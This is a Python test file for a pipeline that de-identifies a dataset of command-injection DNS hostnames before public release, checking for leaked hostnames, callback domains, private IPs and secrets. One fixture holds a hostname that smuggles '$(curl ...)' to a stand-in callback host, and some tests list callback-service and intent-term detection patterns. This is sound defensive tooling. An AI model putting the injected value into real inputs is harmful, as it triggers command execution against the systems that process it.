from __future__ import annotations

import csv
import json
import re
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "scripts"))

from hib_deid import (
    FORBIDDEN_PUBLIC_FIELDS,
    INTENT_SIGNALING_RE,
    PUBLIC_SCHEMA_FIELDS as DEID_PUBLIC_SCHEMA_FIELDS,
    PrivateConfig,
    RESERVED_SUFFIXES,
    anonymize_csv,
    build_bundle,
    canonicalize_artifact,
    read_jsonl,
    verify_release,
)
from validate_public_bundle import extract_validated_bundle, validate_bundle
from validate_release_gate import PUBLIC_SCHEMA_FIELDS as GATE_PUBLIC_SCHEMA_FIELDS, validate_release_gate


def _config() -> PrivateConfig:
    return PrivateConfig(row_id_secret="row-secret", artifact_secret="artifact-secret", shuffle_secret="shuffle-secret")


def _write_private_csv(path: Path) -> None:
    rows = []
    for i in range(60):
        rows.append(
            {
                "ROW_ID": f"row-{i:03d}",
                "CDB": "ACME_CORP_PRIVATE",
                "CONTENT": "acme-prod-usw2.api.$(curl http://x9.acme-callback.net/a).corp",
                "HOSTNAME": "acme-prod-usw2.api.$(curl http://x9.acme-callback.net/a).corp",
                "USERNAME": "",
                "CREATED_TIME": "2025-08-01T00:00:00Z",
                "RESOLVED_LABEL_BOTH_M": "M",
                "DATASET_FAMILY": "dns_hostnames",
                "CONTENT_TYPE": "HOSTNAME",
                "GPT_5_5_DNS_CMD_INJECTION_REASON": "private reason mentions acme-callback.net",
                "CLAUDE_OPUS_4_8_DNS_CMD_INJECTION_REASON": "private reason mentions ACME_CORP_PRIVATE",
            }
        )
    with path.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)


def test_no_raw_hostname_exact_matches_in_release(tmp_path: Path) -> None:
    private_csv = tmp_path / "private.csv"
    public_jsonl = tmp_path / "release.jsonl"
    audit_dir = tmp_path / "audits"
    _write_private_csv(private_csv)

    anonymize_csv(private_csv, public_jsonl, audit_dir, _config())
    public_text = public_jsonl.read_text(encoding="utf-8")

    assert "acme-prod-usw2.api.$(curl http://x9.acme-callback.net/a).corp" not in public_text
    assert "ACME_CORP_PRIVATE" not in public_text
    assert "acme-callback.net" not in public_text


def test_no_raw_canonical_hostname_exact_matches_in_release(tmp_path: Path) -> None:
    private_csv = tmp_path / "private.csv"
    public_jsonl = tmp_path / "release.jsonl"
    audit_dir = tmp_path / "audits"
    _write_private_csv(private_csv)

    anonymize_csv(private_csv, public_jsonl, audit_dir, _config())
    raw_canonical = canonicalize_artifact("acme-prod-usw2.api.$(curl http://x9.acme-callback.net/a).corp")

    assert all(row["released_canonical_artifact"] != raw_canonical for row in read_jsonl(public_jsonl))


def test_reserved_domains_only_for_generated_domains(tmp_path: Path) -> None:
    private_csv = tmp_path / "private.csv"
    public_jsonl = tmp_path / "release.jsonl"
    audit_dir = tmp_path / "audits"
    _write_private_csv(private_csv)

    anonymize_csv(private_csv, public_jsonl, audit_dir, _config())
    for row in read_jsonl(public_jsonl):
        artifact = row["released_artifact"]
        assert artifact.split(".")[-1] in RESERVED_SUFFIXES


def test_no_secrets_tokens_emails_private_ips_or_internal_suffixes(tmp_path: Path) -> None:
    private_csv = tmp_path / "private.csv"
    public_jsonl = tmp_path / "release.jsonl"
    audit_dir = tmp_path / "audits"
    _write_private_csv(private_csv)

    anonymize_csv(private_csv, public_jsonl, audit_dir, _config())
    report = verify_release(private_csv, public_jsonl, audit_dir, _config(), min_k=1)

    checks = report["anonymization"]["privacy_safety_checks"]
    assert checks["emails_usernames_user_ids_device_ids_blockers"] == 0
    assert checks["ip_addresses_outside_documentation_ranges"] == 0
    assert checks["secrets_api_keys_jwts_tokens_signed_urls"] == 0
    assert checks["raw_internal_suffixes_private_tlds"] == 0
    assert checks["live_callback_domains"] == 0
    assert checks["exact_raw_hostname_strings"] == 0
    assert checks["exact_raw_canonical_hostname_strings"] == 0


def test_documentation_ip_ranges_only_for_generated_ips(tmp_path: Path) -> None:
    private_csv = tmp_path / "private.csv"
    rows = [
        {
            "ROW_ID": f"ip-{i:03d}",
            "CDB": "PRIVATE_TENANT",
            "CONTENT": f"10.14.203.{i % 250 + 1}",
            "HOSTNAME": f"10.14.203.{i % 250 + 1}",
            "USERNAME": "",
            "CREATED_TIME": "2025-08-01T00:00:00Z",
            "RESOLVED_LABEL_BOTH_M": "B",
            "DATASET_FAMILY": "dns_hostnames",
            "CONTENT_TYPE": "HOSTNAME",
        }
        for i in range(60)
    ]
    with private_csv.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)
    public_jsonl = tmp_path / "release.jsonl"
    audit_dir = tmp_path / "audits"

    anonymize_csv(private_csv, public_jsonl, audit_dir, _config())
    release_rows = read_jsonl(public_jsonl)

    assert all(row["released_artifact"].startswith("192.0.2.") for row in release_rows)
    assert verify_release(private_csv, public_jsonl, audit_dir, _config(), min_k=1)["anonymization"]["privacy_safety_checks"]["ip_addresses_outside_documentation_ranges"] == 0


def test_callbacks_are_inert_and_reasons_are_omitted(tmp_path: Path) -> None:
    private_csv = tmp_path / "private.csv"
    public_jsonl = tmp_path / "release.jsonl"
    audit_dir = tmp_path / "audits"
    _write_private_csv(private_csv)

    anonymize_csv(private_csv, public_jsonl, audit_dir, _config())
    rows = read_jsonl(public_jsonl)

    assert all(not re.search(r"oast|bxss|callback|burpcollaborator|acme", row["released_artifact"], re.I) for row in rows)
    assert all("reason" not in key.lower() for row in rows for key in row)


def test_generated_hostnames_do_not_signal_malicious_intent(tmp_path: Path) -> None:
    private_csv = tmp_path / "private.csv"
    rows = [
        {
            "ROW_ID": f"intent-{i:03d}",
            "CDB": "PRIVATE_TENANT",
            "CONTENT": "evil-hacker-malicious-attack-exploit.phish-malware.example.net",
            "HOSTNAME": "evil-hacker-malicious-attack-exploit.phish-malware.example.net",
            "USERNAME": "",
            "CREATED_TIME": "2025-08-01T00:00:00Z",
            "RESOLVED_LABEL_BOTH_M": "M",
            "DATASET_FAMILY": "dns_hostnames",
            "CONTENT_TYPE": "HOSTNAME",
        }
        for i in range(60)
    ]
    with private_csv.open("w", newline="", encoding="utf-8") as handle:
        writer = csv.DictWriter(handle, fieldnames=list(rows[0]))
        writer.writeheader()
        writer.writerows(rows)
    public_jsonl = tmp_path / "release.jsonl"
    audit_dir = tmp_path / "audits"

    anonymize_csv(private_csv, public_jsonl, audit_dir, _config())

    intent_re = re.compile(r"hack|malicious|evil|attack|exploit|pwn|phish|malware|virus|ransom|trojan|botnet|backdoor|rootkit", re.I)
    assert all(not intent_re.search(row["released_artifact"]) for row in read_jsonl(public_jsonl))
    assert {row["label"] for row in read_jsonl(public_jsonl)} == {"verified_executable_semantics"}


def test_scanner_coverage_is_reported(tmp_path: Path) -> None:
    private_csv = tmp_path / "private.csv"
    public_jsonl = tmp_path / "release.jsonl"
    audit_dir = tmp_path / "audits"
    _write_private_csv(private_csv)

    anonymize_csv(private_csv, public_jsonl, audit_dir, _config())
    report = verify_release(private_csv, public_jsonl, audit_dir, _config(), min_k=1)
    coverage = report["anonymization"]["scanner_coverage"]

    assert coverage["regex_entropy_secret_scanner"]["status"] == "pass"
    assert coverage["custom_domain_ip_email_guid_token_scanners"]["status"] == "pass"
    assert coverage["public_dns_ct_lookup_policy"]["status"] == "pass"


def test_public_bundle_rejects_private_artifacts(tmp_path: Path) -> None:
    private_dir = tmp_path / "private"
    private_dir.mkdir()
    private_config = private_dir / "anonymization_policy.private.yaml"
    private_config.write_text("row_id_secret: secret\n", encoding="utf-8")

    try:
        build_bundle(tmp_path / "bundle.tar.gz", [private_config], base_dir=tmp_path)
    except ValueError as exc:
        assert "private" in str(exc).lower()
    else:
        raise AssertionError("private artifact was bundled")


def test_public_bundle_uses_relative_archive_names(tmp_path: Path) -> None:
    release_dir = tmp_path / "release"
    release_dir.mkdir()
    release = release_dir / "hib_release.jsonl"
    release.write_text("{}\n", encoding="utf-8")

    hashes = build_bundle(tmp_path / "bundle.tar.gz", [release], base_dir=tmp_path)

    assert list(hashes) == ["release/hib_release.jsonl"]
    assert all(not Path(name).is_absolute() for name in hashes)


def test_public_bundle_rejects_duplicate_archive_names(tmp_path: Path) -> None:
    release_dir = tmp_path / "release"
    release_dir.mkdir()
    release = release_dir / "hib_release.jsonl"
    release.write_text("{}\n", encoding="utf-8")

    try:
        build_bundle(tmp_path / "bundle.tar.gz", [release, release], base_dir=tmp_path)
    except ValueError as exc:
        assert "duplicate bundle archive path" in str(exc).lower()
    else:
        raise AssertionError("duplicate archive member was bundled")


def test_public_bundle_validator_passes_clean_bundle(tmp_path: Path) -> None:
    release_dir = tmp_path / "release"
    release_dir.mkdir()
    release = release_dir / "hib_release.jsonl"
    release.write_text("{}\n", encoding="utf-8")

    bundle = tmp_path / "bundle.tar.gz"
    build_bundle(bundle, [release], base_dir=tmp_path)
    result = validate_bundle(bundle)

    assert result["status"] == "pass"
    assert result["n_files"] == 1


def test_public_policy_declares_forbidden_fields_and_intent_terms() -> None:
    policy_path = Path(__file__).resolve().parents[1] / "configs" / "anonymization_policy.public.yaml"
    policy_text = policy_path.read_text(encoding="utf-8")

    for field in ("dedup_hostname_id", "unique_host_hash", "stable_hostname_hash", "tenant_surrogate"):
        assert f"  - {field}" in policy_text
    assert {"dedup_hostname_id", "unique_host_hash", "stable_hostname_hash", "tenant_surrogate"}.issubset(FORBIDDEN_PUBLIC_FIELDS)

    assert "avoid_obvious_intent_terms:" in policy_text
    for term in ("malicious", "hack", "evil", "attack", "exploit", "phish", "malware", "rootkit"):
        assert f"    - {term}" in policy_text
        assert INTENT_SIGNALING_RE.search(term)


def test_release_gate_validator_passes_sample_artifacts() -> None:
    root = Path(__file__).resolve().parents[1]
    result = validate_release_gate(
        root / "data" / "release" / "hib_release.jsonl",
        root / "data" / "audits",
        root / "data" / "release" / "hib_release_public_bundle.tar.gz",
        count_rows=True,
    )

    assert result["status"] == "pass"
    assert result["row_count_checked"] == 150


def test_release_gate_schema_matches_deid_schema() -> None:
    assert GATE_PUBLIC_SCHEMA_FIELDS == DEID_PUBLIC_SCHEMA_FIELDS


def test_extracted_public_bundle_release_gate_is_self_contained(tmp_path: Path) -> None:
    root = Path(__file__).resolve().parents[1]
    bundle = root / "data" / "release" / "hib_release_public_bundle.tar.gz"
    validate_bundle(bundle)
    extract_validated_bundle(bundle, tmp_path)

    extracted = tmp_path / "deidentification_release"
    completed = subprocess.run(
        [
            sys.executable,
            str(extracted / "scripts" / "validate_release_gate.py"),
            "--public-release",
            str(extracted / "data" / "release" / "hib_release.jsonl"),
            "--audit-dir",
            str(extracted / "data" / "audits"),
            "--bundle",
            str(bundle),
            "--count-rows",
        ],
        cwd=root.parent,
        capture_output=True,
        check=True,
        text=True,
    )

    result = json.loads(completed.stdout)
    assert result["status"] == "pass"
    assert result["row_count_checked"] == 150
